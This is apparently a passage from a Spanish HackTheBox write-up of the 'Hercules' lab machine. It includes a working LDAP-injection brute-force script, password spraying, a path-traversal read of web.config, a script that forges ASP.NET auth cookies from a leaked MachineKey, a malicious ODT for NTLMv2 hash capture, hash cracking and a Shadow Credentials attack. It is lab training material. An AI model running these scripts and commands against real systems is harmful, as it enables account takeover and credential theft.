Vamos a enfocar la inyección para identificar, ya sea, el atributo **password** o **description**.

Utiliza el siguiente payload:
```bash
will.s)(password=*
will.s)(description=*
```

Luego codificamos 2 veces los operadores lógicos para evitar cualquier validación en los **filtros LDAP**, quedando de la siguiente manera:
```bash
will.s%252a%2529%2528password%253d%252a
will.s%252a%2529%2528description%253d%252a
```

Aplica cualquiera de los dos:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura7.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura8.png">
</p>

Observa que, en ambos casos, nos da el mensaje de que el intento de login es fallido, por lo que el usuario lo toma como válido.

Esto nos indica qué en efecto, se está utilizando el **servicio LDAP** para este login.

Al igual que con las **Inyecciones SQL**, podemos tratar de aplicar fuerza bruta para obtener el contenido del atributo **password o description**. Esto funcionaría porque:
* Tenemos una forma de validar si la inyección fue exitosa, siendo el mensaje **Invalid login attempt** el indicador de éxito.
* En la inyección, utilizaríamos varios caracteres para saber cuál es válido, siendo así que dumpeariamos el contenido de cualquier atributo.
* La mejor opción sería utilizar el atributo **description**, ya que puede contener información privilegiada por error.

La inyección sería la siguiente:
```bash
<usuario1>)(description=<caracter1>*
...
<usuario2>)(description=<caracter1>*
...
```
Y así sucesivamente.

El problema es que sería tardado ir de usuario por usuario, probando si la inyección nos permite obtener el contenido de este atributo.

Automatizaremos este proceso usando un script de **Python**:
```bash
#!/usr/bin/env python3
import requests, re, signal, pdb, time, sys, urllib3, string
from termcolor import colored
from pwn import *

# Salida
def def_handler(sig, frame):
        print(colored(f"\n\n[!] Saliendo...\n", 'red'))
        sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Deshabilitando advertencias de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Variables globales
main_url = "https://hercules.htb"
loginPATH = "/Login"
loginPage = "/login"
target = main_url + loginPATH
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits + '!@#$_*-.' + "%^&()=+[]{}|;:',<>?/`~\" \\"
verify_TLS = False
success = "Login attempt failed"
Resp_token = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)

# Usuarios encontrados
KerbUsers = [
        "auditor", "adriana.i", "angelo.o", "ashley.b", "bob.w", "camilla.b", "clarissa.c", "elijah.m", "fiona.c", "harris.d", "heather.s", "jacob.b", "jennifer.a", "jessica.e", "joel.c", ">
]

# Obteniendo token y cookies
def get_token_and_cookie(session):
        response = session.get(main_url + loginPage, verify=verify_TLS)

        token = None
        match = Resp_token.search(response.text)
        if match:
                token = match.group(1)
        return token

# Aplicando Injecciones LDAP
def ldapInjection(username, description_prefix=""):
        session = requests.Session()

        # Obteniendo Token
        token = get_token_and_cookie(session)
        if not token:
                return False

        # Contruyendo payload para LDAP Injection
        if description_prefix:
                escaped_desc = description_prefix
                escaped_desc = escaped_desc.replace('*', '\\2a').replace('(', '\\28').replace(')', '\\29')

                # PAYLOAD
                payload = f"{username}*)(description={escaped_desc}*"

        else:
                payload = f"{username}*)(description=*"

        # Codificación URL doble
        encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))

        data = {
                "Username": encoded_payload,
                "Password": "test",
                "RememberMe": "false",
                "__RequestVerificationToken": token
        }

        try:
                response = session.post(target, data=data, verify=verify_TLS, timeout=5)
                return success in response.text

        except Exception as e:
                return False
    
# Enumerando atributos description/password caracter por caracter
def enumerate_description(username):

        # Comprobando si usuario tiene el atributo description
        if not ldapInjection(username):
                return None
        print(colored(f"User {username} has a description field, enumerating...", 'light_cyan'))

        description = ""
        no_char_count = 0

        p3 = log.progress(colored("Test", 'green'))

        for position in range(50):
                found = False

                for char in characters:
                        test_desc = description + char

                        if ldapInjection(username, test_desc):
                                description += char
                                p3.status(colored(f"Testing in {position} positon: '{char}' -> Current: {description}", 'light_green'))
                                found = True
                                no_char_count = 0
                                break

                        # Pequeño delay para evadir el rate limiting
                        time.sleep(0.01)

                if not found:
                        no_char_count += 1
                        if no_char_count >= 2: # Se detiene despues de 2 posiciones sin careacteres
                                break

        if description:
                print(colored(f"[+] Complete: {username} => {description}", 'magenta'))
                return description
        return None

def main():
        print(colored("#"*60, 'light_green'))
        print(colored("\t Hercules LDAP Description/Password Enumeration", 'light_green'))
        print(colored(f"\t\t Testing {len(KerbUsers)} users", 'light_green'))
        print(colored("#"*60, 'light_green'))
        print()

        p1 = log.progress(colored("LDAP Injections", 'cyan'))
        p1.status(colored("Starting Injections On Hercules Login", 'light_red'))

        time.sleep(0.2)

        found_passwords = {}

        p2 = log.progress(colored("Checking", 'yellow'))

        for user in KerbUsers:

                p2.status(colored(f"Enumerating {user} description", 'blue'))

                password = enumerate_description(user)

                if password:
                        found_passwords[user] = password
                        print(colored(f"\n[+] FOUND: {user}:{password}\n", 'light_yellow'))

        print(colored("\n" + "="*60, 'light_green'))
        print(colored("\t\tENUMERATION COMPLETE", 'light_green'))
        print(colored("="*60, 'light_green'))

        if found_passwords:
                print(colored(f"\nFound {len(found_passwords)} passwords:", 'yellow'))
                for user, pwd in found_passwords.items():
                        print(colored(f" {user}: {pwd}", 'green'))
        else:
                print(colored("\nNo passwords found", 'red'))

if __name__ == "__main__":
        main()
```

Ejecutemos el script para obtener alguna contraseña:
```bash
 python3 LDAPinjection.py
############################################################
	 Hercules LDAP Description/Password Enumeration
		 Testing 34 users
############################################################

[◓] LDAP Injections: Starting Injections On Hercules Login
[../.....] Checking: Enumerating zeke.s description
User johnathan.j has a description field, enumerating...
[-] Test: Testing in 22 positon: '!' -> Current: change*th1s_p@ssw()rd!!
[+] Complete: johnathan.j => change*th1s_p@ssw()rd!!

[+] FOUND: johnathan.j:change*th1s_p@ssw()rd!!

============================================================
		ENUMERATION COMPLETE
============================================================

Found 1 passwords:
 johnathan.j: change*th1s_p@ssw()rd!!
```
Excelente, obtuvimos la contraseña del **usuario johnathan.j**.

Podemos comprobar si la contraseña sirve para este usuario:
```bash
nxc ldap 10.10.11.91 -u 'johnathan.j' -p 'change*th1s_p@ssw()rd!!'
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! STATUS_NOT_SUPPORTED
```
No parece funcionar.

Aun así, esta contraseña puede pertenecer a otro usuario y para evitar cualquier restricción, usaremos el **ataque Password Spraying**.

#### Aplicando Ataque Password Spraying para Identificar Reuso de Contraseña Dumpeada {#pwdSpray}

Para este ataque, podemos usar **netexec** de forma similar a cómo lo aplicamos con **crackmapexec**:
```bash
nxc ldap 10.10.11.91 -u only_names.txt -p 'change*th1s_p@ssw()rd!!' -k --continue-on-success
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [-] hercules.htb\adriana.i:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
...
LDAP        10.10.11.91     389    DC               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!
...
```
Muy bien, vemos que el **usuario ken.w** utiliza esta contraseña.

Ahora probemos con **kerbrute**:
```bash
./kerbrute_linux_386 passwordspray -d hercules.htb --dc 10.10.11.91 only_names.txt 'change*th1s_p@ssw()rd!!'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 10/27/25 - Ronnie Flathers @ropnop

2025/10/27 23:31:12 >  Using KDC(s):
2025/10/27 23:31:12 >  	10.10.11.91:88

2025/10/27 23:31:13 >  [+] VALID LOGIN:	 ken.w@hercules.htb:change*th1s_p@ssw()rd!!
2025/10/27 23:31:13 >  Done! Tested 33 logins (1 successes) in 0.978 seconds
```
De igual forma, obtenemos al **usuario ken.w**.

Como es la contraseña válida para **LDAP**, podemos probarla en el login y ver si nos da acceso:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura9.png">
</p>

Genial, estamos dentro.

### Aplicando Local File Inclusion (LFI) en Dashboard de Página Web {#LFI}

Navegando un poco en el Dashboard, vemos que hay 3 mensajes para nosotros en la sección de **Email**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura10.png">
</p>

Revisando estos mensajes, uno de estos nos indica la razón del uso de **credenciales LDAP** para entrar al login:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura11.png">
</p>

El segundo nos indica que nuestra cuenta fue hackeada y debemos cambiar la contraseña inmediatamente, dándonos un dominio interno para realizar ese cambio:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura12.png">
</p>

Y el tercer mensaje es solo un aumento de sueldo, nada importante.

Revisando las demás secciones, vemos la sección de **Download** que nos permite descargar algunos formularios.

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura13.png">
</p>

Al capturar la descarga con **BurpSuite**, vemos el uso de un parámetro para consultar el formulario a descargar:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura14.png">
</p>

Esta clase de parámetros pueden ser vulnerables a **Local File Inclusion** o **Path Traversal**.

Podemos comprobarlo aplicando **Fuzzing** a este parámetro, usando un wordlist con ruta del **servidor IIS** de **Windows**.

Usaré la herramienta **ffuf** y será necesario copiar la cookie de sesión:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt:FUZZ -u 'https://hercules.htb/Home/Download?fileName=../../FUZZ' -t 300 -b "__RequestVerificationToken=...; .ASPXAUTH=..." -fs 0,485

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://hercules.htb/Home/Download?fileName=../../FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
 :: Header           : Cookie: __RequestVerificationToken=FUo8Ej-XLwahBPYI4N9TpS6dxMAlf_FhjRk25mkOFQ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0,485
________________________________________________

web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duration: 432ms]
:: Progress: [216/216] :: Job [1/1] :: 109 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-b*	     | Para indicar la cookie a usar. |

Tenemos un resultado.

Revisémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura15.png">
</p>

Bien, podemos ver el archivo **web.config**.

Analizando este archivo, podemos ver una sección interesante que es la etiqueta **MachineKey**.

### Forjando Cookie de Forms Authentication de ASP.NET con un Script {#FormsAuth}

¿Qué es **MachineKey**?

| **MachineKey** |
|:--------------:|
| *Define las claves que ASP.NET usa para validar (MAC) datos (por ejemplo ViewState, cookies forms auth, etc.) usando `validationKey` y el algoritmo `HMACSHA256`, y Desencriptar datos cuando `decryption` está activado (aquí `AES`) usando `decryptionKey`.* |

La idea es que con estas llaves podamos crear una cookie de sesión válida de algún usuario.

Sin embargo, tenemos que tener en cuenta el proceso que **ASP.NET** (en versiones anteriores a **ASP.NET Core**) usa para proteger las cookies de autenticación, pues sí revisas la cookie del login, verás una cookie llamda **.ASPXAUTH**.

| **Cookie .ASPXAUTH** |
|:--------------------:|
| *Es la cookie de autenticación por formularios (Forms Authentication) de ASP.NET. Su propósito es mantener la sesión autenticada de un usuario sin necesidad de volver a iniciar sesión en cada petición. ASP.NET la crea después de que un usuario se autentica correctamente (por ejemplo, desde /Login.aspx).* |

Esto se vuelve más complejo, pues para que podamos formar una cookie válida debemos tener también en cuenta la compatibilidad entre cookies de sesión viejas y modernas, pues puede que tengamos algún problema a la hora de forjar una cookie solo para versiones viejas de **ASP.NET**.

Por esta razón fue creado el paquete **AspNetCore.LegacyAuthCookieCompat**, para resolver esa incompatibilidad:

| **Paquete AspNetCore.LegacyAuthCookieCompat** |
|:---------------------------------------------:|
| *Es una biblioteca de compatibilidad (“compat”) que implementa el mismo formato de ticket, cifrado y firma que usaba el viejo System.Web.Security.FormsAuthentication. Permite a las aplicaciones en .NET Core leer, descifrar, firmar y crear cookies .ASPXAUTH de ASP.NET clásico.* |

Con estos conceptos ya vistos, podemos empezar a forjar una cookie de **Forms Authentication**, usando los datos del **MachineKey**.

Para eso utilizaremos un script de **Python** que automatiza el uso de un script de **C#**, para generar una cookie válida que nos ayude a suplantar un usuario como el **web_admin**.

Este script utiliza **dotnet**, por lo que debes tenerlo instalado en tu máquina.

Yo lo instalé de la siguiente manera:
```bash
# Descargando instalador de dotnet
wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh

# Dando permisos y ejecutando instalador para obtener versión 7
chmod +x dotnet-install.sh
./dotnet-install.sh --channel 7.0

# Guardando el uso de dotnet en la zshrc
echo 'export DOTNET_ROOT=$HOME/.dotnet' >> ~/.zshrc
echo 'export PATH=$PATH:$HOME/.dotnet:$HOME/.dotnet/tools' >> ~/.zshrc
source ~/.zshrc
```

Una vez que tengas instalado **dotnet** copia y pega el siguiente script en tu máquina:
```python
#!/usr/bin/env python3
import os
import subprocess
import textwrap
import shutil
import sys

# --- CONFIG ---
validation_key = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
decryption_key = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
username = "web_admin"
user_data = "Web Administrators"
cookie_path = "/"
project_dir = "legacy_auth_auto"
# ----------------

program_cs = f"""using System;
using AspNetCore.LegacyAuthCookieCompat;

{% raw %}
public static class HexUtils
{{
    public static byte[] HexToBinary(string hex)
    {{
        if (hex == null) throw new ArgumentNullException(nameof(hex));
        if (hex.Length % 2 != 0) throw new ArgumentException("Hex string must have even length");
        byte[] bytes = new byte[hex.Length / 2];
        for (int i = 0; i < bytes.Length; i++)
        {{
            bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
        }}
        return bytes;
    }}
}}

class Program
{{
    static void Main(string[] args)
    {{
        string validationKey = "{validation_key}";
        string decryptionKey = "{decryption_key}";

        if (validationKey.Length > 128)
        {{
            validationKey = validationKey.Substring(0, 128);
        }}

        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKey);
        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKey);

        var issueDate = DateTime.Now;
        var expiryDate = issueDate.AddHours(1);

        var formsAuthenticationTicket = new FormsAuthenticationTicket(
            1,
            "{username}",
            issueDate,
            expiryDate,
            false,
            "{user_data}",
            "{cookie_path}"
        );

        var legacyEncryptor = new LegacyFormsAuthenticationTicketEncryptor(
            decryptionKeyBytes,
            validationKeyBytes,
            ShaVersion.Sha256
        );

        var encryptedText = legacyEncryptor.Encrypt(formsAuthenticationTicket);
        Console.WriteLine("Encrypted FormsAuth Ticket:");
        Console.WriteLine(encryptedText);
    }}
}}
"""
{% endraw %}

def run(cmd, cwd=None, capture=False):
    print(f"> {' '.join(cmd)}")
    return subprocess.run(cmd, cwd=cwd, check=True, text=True, capture_output=capture)

def main():
    # check dotnet available
    if shutil.which("dotnet") is None:
        print("ERROR: 'dotnet' no está en PATH. Instala .NET SDK y vuelve a intentar.")
        sys.exit(1)

    if os.path.exists(project_dir):
        print(f"El directorio '{project_dir}' ya existe. Por seguridad, bórralo o cambia project_dir.")
        sys.exit(1)

    os.makedirs(project_dir, exist_ok=True)

    # dotnet new console
    run(["dotnet", "new", "console", "-o", project_dir])

    # add package
    run(["dotnet", "add", project_dir, "package", "AspNetCore.LegacyAuthCookieCompat", "--version", "2.0.5"])

    # overwrite Program.cs
    program_path = os.path.join(project_dir, "Program.cs")
    with open(program_path, "w") as f:
        f.write(program_cs)

    # restore & build
    run(["dotnet", "restore", project_dir])
    run(["dotnet", "build", project_dir])

    # run and capture output
    proc = subprocess.run(["dotnet", "run", "--project", project_dir], text=True, capture_output=True)
    print(proc.stdout)
    if proc.stderr:
        print("--- STDERR ---")
        print(proc.stderr)

if __name__ == "__main__":
    main()
```

Ahora ejecútalo:
```bash
python3 generate_forms_cookie.py
> dotnet new console -o legacy_auth_auto
...
Compilación correcta.
    0 Advertencia(s)
    0 Errores

Tiempo transcurrido 00:00:08.92
Encrypted FormsAuth Ticket:
F44A8A86A97127947E859D90E487A...
```

Copia la cookie y pégala en la sesión actual de la página web utilizando el **Inspector** de tu navegador:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura16.png">
</p>

Recarga la página:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura17.png">
</p>

Muy bien, somos el **usuario web_admin**.

### Analizando Login de Usuario web_admin y Aplicando Sniper Attack para Identificar Archivos Aceptados en Carga de Archivos {#LoginSniper}

Tenemos dos mensajes en el dashboard de este usuario.

Observa que uno de estos es un mensaje del **usuario johnathan** pidiendo un cambio de contraseña:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura18.png">
</p>

Y vemos otro mensaje que nos da una pista de qué podemos hacer:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura19.png">
</p>

El punto 4 nos menciona que, como este usuario, ya podemos cargar archivos, cosa que con el **usuario ken.w** no nos permitía:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura20.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura21.png">
</p>

Pero no sabemos qué clase de archivos podemos subir, por lo que debemos identificar qué clase de archivos nos acepta.

Si bien podemos aplicar un **Sniper Attack** con el **Intruder** de **BurpSuite**, al ser una máquina **Windows**, debe de aceptar archivos que solo se puedan ejecutar en este **SO**.

Aun así, puedes aplicar el ataque.

**CUIDADO**: la cookie de sesión que obtuvimos con el script tiene una duración, por lo que el ataque puede fallar en cierto punto.

Realiza una captura de la carga de archivos y envíala al **Repeater**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura22.png">
</p>

Como payload utilizaremos el wordlist `/usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-extensions.txt`.

Pasando un poco de tiempo, vemos que nuestra cookie deja de funcionar:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura23.png">
</p>

Logramos ver que se intentó enviar un **archivo ODT**, que podemos probarlo si lo mandamos al **Repeater** y le cambiamos la cookie:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura24.png">
</p>

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura25.png">
</p>

Excelente, si está aceptando **archivos ODT**.

Ya tenemos una pista de lo que debemos hacer.

### Cargando Archivo ODT Malicioso para Capturar y Crackear Hash Net NTLMv2 {#MaliciousODT}

La idea es que podamos crear un **archivo ODT** malicioso que, al momento de ser cargado, nos mande o una **Reverse Shell** o comparta el **Hash NTLMv2** del usuario que tenga nuestro archivo.

La mejor opción es irnos por lo segundo.

Ya hemos creado **archivos ODT** maliciosos de manera manual, pero podemos crearlos de manera automatizada usando el siguiente script:
* <a href="https://github.com/lof1sec/Bad-ODF" target="_blank">Repositorio de lof1sec: Bad-ODF</a>

Antes de poder usarlo, necesitamos tener instalada la **librería ezodf y lxml**.

Podemos crear un ambiente virtual de **Python** para evitar cualquier mala configuración:
```bash
python3 -m venv .venv
source .venv/bin/activate
pip install ezodf lxml
```

Listo, ya puedes ejecutar el script de **Python Bad-ODF.py**:
```bash
python3 Bad-ODF.py
  / __ )____ _____/ /     / __ \/ __ \/ ____/

    ____            __      ____  ____  ______
   / __ )____ _____/ /     / __ \/ __ \/ ____/
  / __  / __ `/ __  /_____/ / / / / / / /_    
 / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/    
/_____/\__,_/\__,_/      \____/_____/_/     

Create a malicious ODF document help leak NetNTLM Creds

By Richard Davy 
@rd_pentest
www.secureyourit.co.uk

Please enter IP of listener: Tu_IP
                                                                                                                                                                                              
ls
Bad-ODF.py  bad.odt  README.md
```
Tan solo le dimos nuestra IP y ya nos crea el **archivo ODT** malicioso.

Antes de cargarlo, vamos a abrir un listener con **responder**, para que haga la captura del **Hash NTLMv2**:
```bash
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.

  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
...
```

Ahora sí, carga el archivo malicioso en la página:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura26.png">
</p>

Espera un poco y observa el **responder**:
```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.91
[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
[SMB] NTLMv2-SSP Hash     : natalie.a::HERCULES:8...
[*] Skipping previously captured hash for HERCULES\natalie.a
[*] Skipping previously captured hash for HERCULES\natalie.a
...
```
Obtuvimos el Hash del **usuario natalie.a**.

Cópialo y guárdalo en un archivo de texto, luego usa **JohnTheRipper** para crackearlo:
```bash
nano natalieHash
john -w:/usr/share/wordlists/rockyou.txt natalieHash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Prettyprincess123! (natalie.a)     
1g 0:00:00:11 DONE (2025-11-02 13:18) 0.08944g/s 958969p/s 958969c/s 958969C/s Princess<3..Pongo27
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
Excelente, tenemos su contraseña.

Podemos probarla con **netexec** y ver si funciona en **LDAP**:
```bash
nxc ldap 10.10.11.91 -u 'natalie.a' -p 'Prettyprincess123!' -k
LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
LDAP        10.10.11.91     389    DC               [+] hercules.htb\natalie.a:Prettyprincess123!
```
Sí funciona, pero no nos servirá para ganar acceso a la máquina.

### Investigando e Identificando Vector de Ataque con BloodHound {#BloodHound}

Enumeremos el **AD** usando la herramienta **bloodhound-python**:
```bash
bloodhound-python -u ken.w -p 'change*th1s_p@ssw()rd!!' -c All -d hercules.htb -ns 10.10.11.91 --zip --use-ldap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hercules.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.hercules.htb
INFO: Found 49 users
INFO: Found 62 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
```
Analicemos toda la información que obtuvimos.

Si investigamos al **usuario natalie.a**, veremos que pertenece al grupo **Web Support**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura27.png">
</p>

Y dentro de este grupo, veremos que también está el **usuario ken.w** y el **usuario johnathan.j**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura28.png">
</p>

Observa que este grupo tiene el **permiso GenericWrite**.

| **Permiso GenericWrite** |
|:------------------------:|
| *En Active Directory (AD), el permiso GenericWrite es un permiso de control de acceso (ACE) que otorga la capacidad de modificar la mayoría de los atributos de un objeto. En otras palabras, si una cuenta o grupo tiene GenericWrite sobre un objeto (usuario, grupo, equipo, etc.), puede cambiar muchos de sus valores, incluyendo algunos críticos como contraseñas, claves o miembros de grupos.* |

Entonces, nuestro **usuario natalie.a** puede modificar muchos de los atributos de estos 6 usuarios.

Investigando las rutas más cortas a los **Domain Admins**, veremos que el **usuario auditor** tiene bastantes privilegios, siendo un objetivo potente al que podemos apuntar:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura29.png">
</p>

Este mismo usuario pertenece al grupo **Remote Management Users**, que es el grupo que puede conectarse remotamente al **AD**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura30.png">
</p>

Y ahí vemos a otro usuario llamado **ashley.b**, siendo otro posible usuario al que podemos apuntar.

Podemos ver a qué otros grupos pertenece el **usuario auditor** y los permisos que tiene sobre ellos:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura31.png">
</p>

Ahí podemos ver 2 grupos de nuestro interés, siendo el grupo **Helpdesk Administrators y Security Helpdesk**, pues ambos grupos tienen el **permiso ForceChangePassword** sobre el **usuario auditor**:

| **Permiso ForceChangePassword** |
|:-------------------------------:|
| *ForceChangePassword (a veces mostrado como User-Force-Change-Password o Reset Password / Force change) es un “extended right” en Active Directory que permite a la identitdad que lo posee restablecer la contraseña de otro objeto (usuario o máquina) sin conocer la contraseña actual. En la práctica: si tienes ese derecho sobre la cuenta de victima, puedes fijar una nueva contraseña para victima y luego autenticarte como ella (o usarla según el tipo de cuenta).* |

Podemos revisar los usuarios que pertenecen al grupo **Security Helpdesk**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura32.png">
</p>

Solo hay dos usuarios aquí:
* El **usuario mark.s**.
* Y el **usuario stephen.m**.

Y vemos los usuarios que hay en el grupo **Helpdesk Administrators**:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura33.png">
</p>

Siendo que hay 6 usuarios aquí:
* El **usuario jessica.e**.
* El **usuario stephanie.w**.
* El **usuario johanna.f**.
* El **usuario heather.s**.
* El **usuario camilla.b**.
* Y el **usuario mikayla.a**.

Lo interesante comienza cuando analizamos al **usuario bob.w**, pues podemos notar que, como en otros usuarios, tiene un certificado de autenticación creado:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura34.png">
</p>

Observa que tenemos activo el grupo **Enterprise Key Admins** y vemos cómo se relaciona con todo el dominio:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura35.png">
</p>

Además, nuestro **usuario natalie.a**, también se le ha creado un certificado de autenticación:

<p align="center">
<img src="/assets/images/htb-writeup-hercules/Captura36.png">
</p>

Esto puede dar pie al **Shadow Credentials Attack Chain**.

### Aplicando Shadow Credentials Attack Chain para Ganar Acceso a la Máquina AD {#Shadow}

¿Qué es el **Shadow Credentials Attack Chain**?

| **Shadow Credentials Attack Chain** |
|:-----------------------------------:|
| *Shadow Credentials attack chain (cadena de ataque de credenciales en la sombra) es una técnica de persistencia/privilegio en entornos Active Directory que aprovecha la capacidad legítima de Windows para autenticar con claves/certificados (p. ej. Windows Hello for Business / PKINIT) para inyectar una clave pública en un objeto AD (usuario o equipo) y luego autenticarse como ese objeto sin conocer su contraseña. Es una forma muy sigilosa de «puerta trasera» porque no depende de hashes/contraseñas normales y puede pasar desapercibida si no se auditan los atributos adecuados.* |

Te dejo estos blogs que explican cómo aplicar este ataque:
* <a href="https://www.hackingarticles.in/shadow-credentials-attack/" target="_blank">Shadow Credentials Attack</a>
* <a href="https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204" target="_blank">Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory</a>

Para realizar este ataque, ocuparemos la herramienta **certipy-ad**:

| **certipy-ad** |
|:--------------:|
| *Certipy (paquete certipy-ad) es una herramienta ofensiva en Python diseñada para enumerar, analizar y abusar de Active Directory Certificate Services (AD CS). Se usa en auditorías/CTFs para detectar plantillas/CA mal configuradas y, cuando es posible, solicitar certificados, extraer claves/PKCS#12 (PFX) y autenticarse usando certificados (PKINIT) para escalar privilegios en un dominio Windows.* |

La idea es la siguiente:
* Utilizar a nuestro **usuario natalie.a** para poder crear un certificado de autenticación válido del **usuario bob.w**, sin que tengamos su contraseña.
* El objetivo es poder llegar al **usuario auditor** para poder ganar acceso a la máquina **AD**.
* Quizá podamos usar al **usuario bob.w** para más enumeración.

Para hacer esto, primero necesitamos un **TGT** del **usuario natalie.a**:
```bash
impacket-getTGT -dc-ip 10.10.11.91 hercules.htb/natalie.a:Prettyprincess123!
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in natalie.a.ccache
```

Utilizamos el **archivo CCACHE** junto a la herramienta **certipy-ad**, para aplicar el ataque y podamos obtener un certificado válido y un **Hash NT** del **usuario bob.w**:
```bash
KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -dc-host DC.hercules.htb -account bob.w -k
Certipy  v5.0.3 - by Oliver Lyak (ly4k)
...
[*] Targeting user 'bob.w'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'a85a19f2bdee48d08462a5a6b82b605c'
[*] Adding Key Credential with device ID 'a85a19f2bdee48d08462a5a6b82b605c' to the Key Credentials for 'bob.w'
[*] Successfully added Key Credential with device ID 'a85a19f2bdee48d08462a5a6b82b605c' to the Key Credentials for 'bob.w'
[*] Authenticating as 'bob.w' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'bob.w@hercules.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'bob.w.ccache'
[*] Wrote credential cache to 'bob.w.ccache'
[*] Trying to retrieve NT hash for 'bob.w'
[*] Restoring the old Key Credentials for 'bob.w'
[*] Successfully restored the old Key Credentials for 'bob.w'
[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
